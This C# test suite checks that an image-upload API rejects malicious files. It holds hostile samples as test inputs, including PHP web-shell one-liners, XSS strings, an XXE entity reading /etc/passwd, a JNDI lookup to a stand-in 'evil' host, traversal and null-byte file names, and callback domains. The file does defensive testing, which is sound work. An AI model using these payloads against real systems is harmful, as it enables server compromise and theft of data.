using System.Buffers.Binary;
using System.Text;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using SecureImageUpload.Api;
using SecureImageUpload.Api.Services;
using SecureImageUpload.Api.Validation;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.PixelFormats;
using ImageFormat = SecureImageUpload.Api.Validation.ImageFormat;

namespace SecureImageUpload.Tests;

public sealed class UploadPipelineTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "siu-tests-" + Guid.NewGuid().ToString("N"));

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true);
    }

    // ---------- helpers ----------

    private ImageUploadService Service(Action<UploadOptions>? configure = null)
    {
        var options = new UploadOptions { StorageRoot = _root };
        configure?.Invoke(options);
        IOptions<UploadOptions> wrapped = Options.Create(options);
        return new ImageUploadService(wrapped, new ImageSanitizer(wrapped), new ImageStorage(wrapped), NullLogger<ImageUploadService>.Instance);
    }

    private static byte[] Png(int width = 16, int height = 12)
    {
        using var image = new Image<Rgba32>(width, height, new Rgba32(200, 30, 30, 255));
        using var stream = new MemoryStream();
        image.SaveAsPng(stream);
        return stream.ToArray();
    }

    private static byte[] Jpeg(int width = 16, int height = 12)
    {
        using var image = new Image<Rgba32>(width, height, new Rgba32(30, 30, 200, 255));
        using var stream = new MemoryStream();
        image.SaveAsJpeg(stream);
        return stream.ToArray();
    }

    private static byte[] PngChunk(string type, byte[] body)
    {
        byte[] chunk = new byte[12 + body.Length];
        BinaryPrimitives.WriteUInt32BigEndian(chunk, (uint)body.Length);
        Encoding.ASCII.GetBytes(type).CopyTo(chunk, 4);
        body.CopyTo(chunk, 8);
        BinaryPrimitives.WriteUInt32BigEndian(chunk.AsSpan(8 + body.Length), Crc32.Compute(chunk.AsSpan(4, 4 + body.Length)));
        return chunk;
    }

    /// <summary>Inserts a chunk right after IHDR (8-byte signature + 25-byte IHDR chunk).</summary>
    private static byte[] PngWithChunk(string type, byte[] body)
    {
        byte[] png = Png();
        return [.. png[..33], .. PngChunk(type, body), .. png[33..]];
    }

    /// <summary>Inserts a segment (COM by default) right after SOI.</summary>
    private static byte[] JpegWithSegment(byte[] payload, byte marker = 0xFE)
    {
        byte[] jpeg = Jpeg();
        byte[] header = [0xFF, marker, (byte)((payload.Length + 2) >> 8), (byte)(payload.Length + 2)];
        return [.. jpeg[..2], .. header, .. payload, .. jpeg[2..]];
    }

    private static byte[] Ascii(string s) => Encoding.ASCII.GetBytes(s);

    private Task<StoredImage> Upload(byte[] data, string name, string contentType, Action<UploadOptions>? configure = null) =>
        Service(configure).ProcessAsync("user-1", name, contentType, data, CancellationToken.None);

    private async Task AssertRejected(RejectReason expected, byte[] data, string name, string contentType, Action<UploadOptions>? configure = null)
    {
        var ex = await Assert.ThrowsAsync<UploadRejectedException>(() => Upload(data, name, contentType, configure));
        Assert.Equal(expected, ex.Reason);
        Assert.False(Directory.Exists(_root) && Directory.EnumerateFiles(_root, "*", SearchOption.AllDirectories).Any(), "nothing may be stored on rejection");
    }

    private byte[] StoredBytes() => File.ReadAllBytes(Directory.EnumerateFiles(_root, "*", SearchOption.AllDirectories).Single());

    // ---------- accepted ----------

    [Fact]
    public async Task Valid_png_is_accepted_and_stored_under_random_name()
    {
        StoredImage stored = await Upload(Png(), "photo.png", "image/png");

        Assert.Equal(ImageFormat.Png, stored.Format);
        Assert.Equal((16, 12), (stored.Width, stored.Height));
        string file = Directory.EnumerateFiles(_root, "*", SearchOption.AllDirectories).Single();
        Assert.Equal(stored.Id + ".png", Path.GetFileName(file));
        Assert.DoesNotContain("photo", file);
    }

    [Theory]
    [InlineData("photo.jpg")]
    [InlineData("photo.JPEG")]
    [InlineData("my.holiday.photo.jpg")]
    public async Task Valid_jpeg_is_accepted(string name)
    {
        StoredImage stored = await Upload(Jpeg(), name, "image/jpeg");
        Assert.Equal(ImageFormat.Jpeg, stored.Format);
        Assert.Equal(ImageFormat.Jpeg, ImageSignature.Detect(StoredBytes()));
    }

    [Fact]
    public async Task Metadata_is_stripped_by_reencoding()
    {
        byte[] withComment = JpegWithSegment(Ascii("SECRET-MARKER-12345 https://tracker.example.org/pixel"));
        byte[] withText = PngWithChunk("tEXt", Ascii("Comment\0SECRET-MARKER-12345"));

        await Upload(withComment, "a.jpg", "image/jpeg");
        Assert.Equal(-1, StoredBytes().AsSpan().IndexOf(Ascii("SECRET-MARKER")));
        Directory.Delete(_root, true);

        await Upload(withText, "a.png", "image/png");
        Assert.Equal(-1, StoredBytes().AsSpan().IndexOf(Ascii("SECRET-MARKER")));
    }

    [Fact]
    public async Task Benign_xmp_namespaces_do_not_trigger_url_rejection()
    {
        byte[] xmp = Ascii("http://ns.adobe.com/xap/1.0/\0<?xpacket begin=''?><x:xmpmeta xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'/>");
        await Upload(JpegWithSegment(xmp, 0xE1), "a.jpg", "image/jpeg", o => o.RejectExternalUrls = true);
    }

    // ---------- file name / declared type ----------

    [Theory]
    [InlineData("shell.php")]
    [InlineData("image.gif")]
    [InlineData("image.svg")]
    [InlineData("image.png.exe")]
    [InlineData("image.png.txt")]
    [InlineData("image.jpg.bak")]
    [InlineData("image.jpeg.zip")]
    [InlineData("image.png.unknown")]
    [InlineData("image.pngx")]
    [InlineData("image.xpng")]
    public Task Non_image_extension_is_rejected(string name) => AssertRejected(RejectReason.UnsupportedType, Png(), name, "image/png");

    [Theory]
    [InlineData("shell.php.png")]
    [InlineData("shell.pHp5.png")]
    [InlineData("shell.aspx.png")]
    [InlineData("shell.php\0.png")]
    [InlineData("shell.php%00.png")]
    [InlineData("shell.asp;.png")]
    [InlineData("a.png::$DATA")]
    [InlineData("..\\..\\a.png")]
    [InlineData("../a.png")]
    [InlineData("a.png.")]
    [InlineData("a.png ")]
    [InlineData(".png")]
    [InlineData("a\r\nb.png")]
    [InlineData("a\u202Egnp.exe.png")]
    [InlineData("shell\uFF0E\uFF50\uFF48\uFF50.png")]
    [InlineData("CON.png")]
    [InlineData("noextension")]
    [InlineData("imagepng")]
    [InlineData("")]
    public Task Malicious_file_name_is_rejected(string name) => AssertRejected(RejectReason.BadFileName, Png(), name, "image/png");

    [Fact]
    public Task Content_type_mismatch_is_rejected() => AssertRejected(RejectReason.TypeMismatch, Png(), "a.png", "image/jpeg");

    [Fact]
    public Task Non_image_content_type_is_rejected() => AssertRejected(RejectReason.TypeMismatch, Png(), "a.png", "application/octet-stream");

    [Fact]
    public Task Png_bytes_with_jpg_extension_are_rejected() => AssertRejected(RejectReason.TypeMismatch, Png(), "a.jpg", "image/jpeg");

    // ---------- magic bytes / structure ----------

    [Theory]
    [InlineData("GIF89a<?php system($_GET[0]); ?>")]
    [InlineData("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>")]
    [InlineData("MZ\u0090\0\u0003\0\0\0")]
    [InlineData("%PDF-1.7")]
    public Task Wrong_magic_bytes_are_rejected(string content) =>
        AssertRejected(RejectReason.UnsupportedType, Encoding.Latin1.GetBytes(content), "a.png", "image/png");

    [Fact]
    public Task Magic_bytes_only_are_rejected() =>
        AssertRejected(RejectReason.MalformedImage, [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. Ascii("<?ph")], "a.png", "image/png");

    [Fact]
    public Task Jpeg_magic_followed_by_garbage_is_rejected() =>
        AssertRejected(RejectReason.MalformedImage, [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x02, 0x41, 0x41, 0x41], "a.jpg", "image/jpeg");

    [Fact]
    public Task Png_with_appended_zip_is_rejected() =>
        AssertRejected(RejectReason.TrailingData, [.. Png(), .. Ascii("PK\u0003\u0004payload")], "a.png", "image/png");

    [Fact]
    public Task Jpeg_with_appended_data_is_rejected_in_strict_mode() =>
        AssertRejected(RejectReason.TrailingData, [.. Jpeg(), .. Ascii("harmless-looking tail")], "a.jpg", "image/jpeg", o => o.RejectTrailingData = true);

    [Fact]
    public async Task Phone_photo_with_appended_gain_map_is_accepted_and_tail_is_dropped()
    {
        // Ultra HDR / Samsung layout: a second complete JPEG appended after the primary image's EOI.
        byte[] primary = Jpeg(), gainMap = Jpeg(8, 6);
        StoredImage stored = await Upload([.. primary, .. gainMap], "20261116_120000.jpg", "image/jpeg");

        Assert.Equal((16, 12), (stored.Width, stored.Height));
        // Strict validation throws on any byte after EOI, so passing it proves the tail is gone.
        JpegStructureValidator.Validate(StoredBytes(), new UploadOptions { RejectTrailingData = true });
    }

    [Fact]
    public Task Png_with_any_appended_data_is_always_rejected() =>
        AssertRejected(RejectReason.TrailingData, [.. Png(), .. Ascii("harmless-looking tail")], "a.png", "image/png", o => o.RejectTrailingData = false);

    [Fact]
    public async Task Tolerated_trailer_is_still_scanned_and_then_dropped()
    {
        await AssertRejected(RejectReason.ActiveContent, [.. Jpeg(), .. Ascii("<?php echo 1;")], "a.jpg", "image/jpeg", o => o.RejectTrailingData = false);

        await Upload([.. Jpeg(), .. Ascii("TAIL-MARKER-777")], "a.jpg", "image/jpeg", o => o.RejectTrailingData = false);
        Assert.Equal(-1, StoredBytes().AsSpan().IndexOf(Ascii("TAIL-MARKER")));
    }

    [Fact]
    public Task Truncated_jpeg_is_rejected() => AssertRejected(RejectReason.MalformedImage, Jpeg()[..^40], "a.jpg", "image/jpeg");

    [Fact]
    public Task Truncated_png_is_rejected() => AssertRejected(RejectReason.MalformedImage, Png()[..^20], "a.png", "image/png");

    [Fact]
    public Task Png_with_bad_crc_is_rejected()
    {
        byte[] png = Png();
        png[20] ^= 0xFF; // inside IHDR
        return AssertRejected(RejectReason.MalformedImage, png, "a.png", "image/png");
    }

    [Fact]
    public Task Animated_png_is_rejected() => AssertRejected(RejectReason.MalformedImage, PngWithChunk("acTL", new byte[8]), "a.png", "image/png");

    [Fact]
    public Task Unknown_critical_png_chunk_is_rejected() => AssertRejected(RejectReason.MalformedImage, PngWithChunk("EVIL", new byte[8]), "a.png", "image/png");

    [Fact]
    public Task Pixel_flood_png_is_rejected_before_decoding()
    {
        // Rewrite IHDR to claim 60000x60000 with a valid CRC: a classic decompression bomb header.
        byte[] png = Png();
        BinaryPrimitives.WriteUInt32BigEndian(png.AsSpan(16), 60000);
        BinaryPrimitives.WriteUInt32BigEndian(png.AsSpan(20), 60000);
        BinaryPrimitives.WriteUInt32BigEndian(png.AsSpan(29), Crc32.Compute(png.AsSpan(12, 17)));
        return AssertRejected(RejectReason.DimensionsExceeded, png, "a.png", "image/png");
    }

    [Fact]
    public Task Oversized_jpeg_dimensions_are_rejected() =>
        AssertRejected(RejectReason.DimensionsExceeded, Jpeg(300, 20), "a.jpg", "image/jpeg", o => o.MaxWidth = 200);

    [Fact]
    public async Task Lying_png_header_can_only_yield_a_clean_image_within_limits()
    {
        // Header claims more rows than the pixel data provides. The decoder is tolerant and pads the image,
        // so the guarantee is not "rejected" but "whatever is stored is a canonical re-encoded file within limits".
        byte[] png = Png();
        BinaryPrimitives.WriteUInt32BigEndian(png.AsSpan(20), 4000);
        BinaryPrimitives.WriteUInt32BigEndian(png.AsSpan(29), Crc32.Compute(png.AsSpan(12, 17)));

        StoredImage stored = await Upload(png, "a.png", "image/png");

        Assert.Equal((16, 4000), (stored.Width, stored.Height));
        ImageStructure structure = PngStructureValidator.Validate(StoredBytes(), new UploadOptions());
        Assert.Empty(structure.MetadataRegions);
    }

    [Fact]
    public Task Empty_file_is_rejected() => AssertRejected(RejectReason.BadRequest, [], "a.png", "image/png");

    [Fact]
    public Task Too_large_file_is_rejected() => AssertRejected(RejectReason.TooLarge, Png(), "a.png", "image/png", o => o.MaxFileBytes = 50);

    // ---------- embedded payloads ----------

    [Theory]
    [InlineData("<?php system($_GET['c']); ?>")]
    [InlineData("<?PHP eval($_POST[1]);")]
    [InlineData("<?=`$_GET[0]`?>")]
    [InlineData("<script>alert(document.domain)</script>")]
    [InlineData("<ScRiPt src=//evil>")]
    [InlineData("<svg/onload=alert(1)>")]
    [InlineData("<%@ Page Language=\"C#\" %>")]
    [InlineData("<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")]
    [InlineData("${jndi:ldap://evil/a}")]
    [InlineData("#!/bin/sh\nid")]
    public async Task Active_content_in_metadata_is_rejected(string payload)
    {
        await AssertRejected(RejectReason.ActiveContent, JpegWithSegment(Ascii(payload)), "a.jpg", "image/jpeg");
        await AssertRejected(RejectReason.ActiveContent, PngWithChunk("tEXt", Ascii("Comment\0" + payload)), "a.png", "image/png");
    }

    [Fact]
    public Task Utf16_encoded_payload_is_rejected() =>
        AssertRejected(RejectReason.ActiveContent, JpegWithSegment(Encoding.Unicode.GetBytes("<script>alert(1)</script>"), 0xE1), "a.jpg", "image/jpeg");

    [Fact]
    public Task Payload_hidden_in_compressed_png_text_is_rejected()
    {
        using var compressed = new MemoryStream();
        using (var zlib = new System.IO.Compression.ZLibStream(compressed, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
            zlib.Write(Ascii("<?php passthru($_GET[0]);"));
        byte[] body = [.. Ascii("Comment\0"), 0, .. compressed.ToArray()];
        return AssertRejected(RejectReason.ActiveContent, PngWithChunk("zTXt", body), "a.png", "image/png");
    }

    [Fact]
    public Task Zip_bomb_in_png_text_chunk_is_rejected()
    {
        using var compressed = new MemoryStream();
        using (var zlib = new System.IO.Compression.ZLibStream(compressed, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
            zlib.Write(new byte[8 * 1024 * 1024]);
        byte[] body = [.. Ascii("Comment\0"), 0, .. compressed.ToArray()];
        return AssertRejected(RejectReason.MalformedImage, PngWithChunk("zTXt", body), "a.png", "image/png");
    }

    // ---------- canary tokens / external references ----------

    [Theory]
    [InlineData("http://canarytokens.com/images/abc123def456/contact.php")]
    [InlineData("https://abc123.CanaryTokens.org/x.png")]
    [InlineData("abc123.oastify.com")]
    [InlineData("http://x.burpcollaborator.net/")]
    [InlineData("//c5k2abc.interact.sh/a")]
    [InlineData("https://webhook.site/1b2c3d")]
    public async Task Canary_and_callback_domains_are_rejected(string url)
    {
        await AssertRejected(RejectReason.CanaryToken, JpegWithSegment(Ascii("<x:xmpmeta href='" + url + "'/>"), 0xE1), "a.jpg", "image/jpeg");
        await AssertRejected(RejectReason.CanaryToken, PngWithChunk("iTXt", Ascii("XML:com.adobe.xmp\0\0\0\0\0" + url)), "a.png", "image/png");
    }

    [Fact]
    public Task Utf16_canary_url_is_rejected() =>
        AssertRejected(RejectReason.CanaryToken, JpegWithSegment(Encoding.Unicode.GetBytes("http://canarytokens.com/t/abc"), 0xE1), "a.jpg", "image/jpeg");

    [Fact]
    public Task Custom_canary_domain_from_configuration_is_rejected() =>
        AssertRejected(RejectReason.CanaryToken, JpegWithSegment(Ascii("https://t.my-honeypot.example/x")), "a.jpg", "image/jpeg",
            o => o.ExtraCanaryDomains = ["my-honeypot.example"]);

    [Theory]
    [InlineData("https://unknown-tracker.example.org/pixel.gif")]
    [InlineData("http://203.0.113.7/beacon")]
    [InlineData(@"\\attacker-host\share\icon.png")]
    [InlineData("ftp://files.example.net/x")]
    public async Task External_references_follow_policy(string reference)
    {
        byte[] jpeg = JpegWithSegment(Ascii(reference));
        await AssertRejected(RejectReason.ExternalUrl, jpeg, "a.jpg", "image/jpeg", o => o.RejectExternalUrls = true);

        await Upload(jpeg, "a.jpg", "image/jpeg"); // default policy: logged, stripped, accepted
        Assert.Equal(-1, StoredBytes().AsSpan().IndexOf(Ascii(reference[..12])));
    }

    // ---------- storage isolation ----------

    [Fact]
    public async Task Stored_image_is_only_resolvable_by_its_owner()
    {
        IOptions<UploadOptions> options = Options.Create(new UploadOptions { StorageRoot = _root });
        var storage = new ImageStorage(options);
        var service = new ImageUploadService(options, new ImageSanitizer(options), storage, NullLogger<ImageUploadService>.Instance);

        StoredImage stored = await service.ProcessAsync("alice", "a.png", "image/png", Png(), CancellationToken.None);

        var own = storage.TryOpen("alice", stored.Id);
        Assert.NotNull(own);
        own.Value.Stream.Dispose();
        Assert.Null(storage.TryOpen("bob", stored.Id));
        Assert.Null(storage.TryOpen("alice", "../" + stored.Id));
        Assert.Null(storage.TryOpen("alice", stored.Id + ".png"));
    }
}
